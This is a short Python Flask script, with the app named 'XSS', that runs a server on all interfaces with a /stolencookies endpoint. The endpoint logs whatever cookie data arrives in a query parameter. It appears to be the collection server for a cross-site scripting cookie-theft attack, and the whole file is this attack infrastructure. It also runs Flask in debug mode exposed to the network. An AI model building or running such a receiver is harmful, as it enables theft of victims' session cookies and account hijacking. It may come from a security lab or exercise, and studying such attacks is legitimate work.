from flask import Flask, request, jsonify, make_response, render_template
import requests
import json
import jinja2

app = Flask('XSS')

@app.route('/stolencookies', methods=['GET'])
def cookies():
    info = request.args.get('cookies')
    if info:
        print(info, flush=True)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5558)